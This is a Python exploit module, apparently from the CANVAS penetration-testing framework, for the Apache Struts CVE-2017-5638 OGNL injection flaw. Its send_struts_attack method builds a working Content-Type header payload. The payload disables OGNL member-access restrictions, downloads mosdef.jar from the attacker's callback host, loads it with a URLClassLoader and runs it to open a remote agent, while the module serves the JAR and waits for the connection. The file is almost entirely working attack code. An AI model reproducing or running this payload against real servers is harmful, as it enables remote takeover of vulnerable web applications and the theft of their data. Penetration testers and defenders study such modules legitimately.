#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path:
    sys.path.append(".")

import logging
import os
import base64
import struct
import socket
import re


from urllib import quote
from time import sleep


import canvasengine
import urllib
import random
import libs.spkproxy as spkproxy


from exploitutils import *
from tcpexploit import *
from canvasexploit import *


NAME                            = "struts_ognl"
DESCRIPTION                     = "Struts S-205 OGNL Code Execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Apache"
DOCUMENTATION['Repeatability']  = "One shot"
DOCUMENTATION['CVE Name']       = "CVE-2017-5638"
DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638"
DOCUMENTATION['References']     = ["http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-5638-apache-struts-vulnerability-remote-code-execution/",
                                   "http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html",
                                   "https://github.com/tengzhangchao/Struts2_045-Poc",
                                   ]

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['VERSION']             = ["2.3.5-2.3.31", "2.5-2.5.10"]

DOCUMENTATION['NOTES'] = """
The JAR Server will listen on the port provided in the UI. However, if that port is unavailable,
a random one will be chosen.

Example vulnerable application: struts2-showcase in Struts 2.3.31 .
Example URL: http://172.16.196.137:8080/struts2-showcase/showcase.action

Versions tested:

> Ubuntu Linux 14.04.3
Java 7u22/Tomcat 8.5.11/Struts 2.3.31
"""

CHANGELOG = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port               = 8080
        self.jarserver_port     = 9999
        self.host               = ""
        self.version            = 0
        self.done               = 0
        self.ssl                = ""
        self.name               = NAME
        self.basepath           = ""

        self.mosdef_type = "UNIVERSAL"
        self.http_ssl = False

        # self.command            = None
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.content_type       = ""

        self.targetpath         = "/"

        self.javamosdef_data = None
        with open(os.path.join(os.path.dirname(__file__), "Resources", "mosdef.jar"), "rb") as handle:
            self.javamosdef_data = handle.read()


    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.basepath=self.argsDict.get("basepath",self.basepath)
        self.basicauth_user=self.argsDict.get("basicauth_user", None)
        self.basicauth_password=self.argsDict.get("basicauth_password", None)
        self.jarserver_port=int(self.argsDict.get("jarserver_port"))
        self.vhost = self.argsDict.get("vhost")
        self.ssl=self.argsDict.get("ssl",self.ssl)

        # logging.info("self.host:%s" % repr(self.host))
        # logging.info("self.port:%s" % repr(self.port))
        # logging.info("self.basepath:%s" % repr(self.basepath))
        # logging.info("self.basicauth_user:%s" % repr(self.basicauth_user))
        # logging.info("self.basicauth_password:%s" % repr(self.basicauth_password))
        # logging.info("self.jarserver_port:%s" % repr(self.jarserver_port))
        # logging.info("self.vhost :%s" % repr(self.vhost))
        # logging.info("self.ssl:%s" % repr(self.ssl))

        return

    def send_struts_attack(self):
        header = {}
        header["Content-Type"]="".join(["%{",
                                        "(#reqtype='multipart/form-data').",
                                        "(#defma=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).",
                                        "(#thema?(#thema=#defma):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).",
                                        "(#outil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).",
                                        "(#data={#outil.getExcludedPackageNames(), #outil.getExcludedPackageNamePatterns(), #outil.getExcludedClasses()}).",
                                        "(#data.{#this.clear()}).",
                                        "(#context.setMemberAccess(#defma))",
                                        ")).",
                                "(#newurl=new java.net.URL('http://%s:%d/mosdef.jar'))." % (self.callback.ip, self.jarserver_port),
                                "(#urls=new java.net.URL[1]).",
                                "(@java.util.Arrays@fill(#urls, #newurl)).",
                                "(#mainargs=new java.lang.String[5]).",
                                "(#mainargs[0]='%s')." % self.callback.ip,
                                "(#mainargs[1]='%d')." % self.callback.port,
                                "(#mainargs[2]='0').",
                                "(#mainargs[3]='False').",
                                "(#mainobj=new java.lang.Object[1]).",
                                "(#mainobj[0] = #mainargs).",
                                "(#urlcl=new java.net.URLClassLoader(#urls)).",
                                "(#main_class=#urlcl.loadClass('MosdefMain')).",
                                "(#main_method=#main_class.getMethods()).",
                                "(#obtained_null=#mainargs[4]).",
                                "(#called_method=#main_method[0]).",
                                "(#res=#called_method.invoke(#obtained_null, #mainargs))",
                                        "}"])

        self.send_struts_request(header)
        logging.info("attack sent, waiting for callback on %s:%d" % (self.callback.ip, self.callback.port))

    def send_struts_request(self, header, testing=False):
        protocol = "https" if self.ssl else "http"
        auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password) if self.basicauth_user else None

        host_name = self.host
        if self.vhost:
            host_name = self.vhost


        host_string = ("%s:%d" % (self.host, self.port)) if self.port != 80 else host_name
        target_string = "%s://%s" % (protocol, host_string)


        logging.info("connecting to: %s" % (target_string))

        self.ua = spkproxy.UserAgent(target_string, auth=auth, hostname=host_name, exploit=self)

        for (key, value) in header.iteritems():
            self.ua.addHeader(key, value)

        self.ua.addHeader("Host", host_string)
        self.ua.addHeader("Connection", "close")
        self.ua.addHeader("Accept-Encoding","identity")
        self.ua.addHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")

        kwargs = None
        (response, response_code) = (None, None)

        descriptor = self.ua.GET("/%s" % (self.basepath), noresponse=True)

        return descriptor

    def setup_webserver(self):

        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"] = self.jarserver_port
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["auto_port"] = True
        app.argsDict["sourcedata"] = self.javamosdef_data
        return_value = app.listen()

        return app

    def run(self):
        self.getargs()

        self.server = self.setup_webserver()
        self.jarserver_port = self.server.port

        logging.info("sending malicious request")

        self.send_struts_attack()

        logging.info("started server for MOSDEF JAR")

        got_connection = False
        while self.server.accept():
            got_connection = True

        if got_connection:
            logging.info("Got a connection to our jar server")
            return 1
        else:
            logging.critical("Failed to get a connection to the MOSDEF JAR server")
            return 0


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)


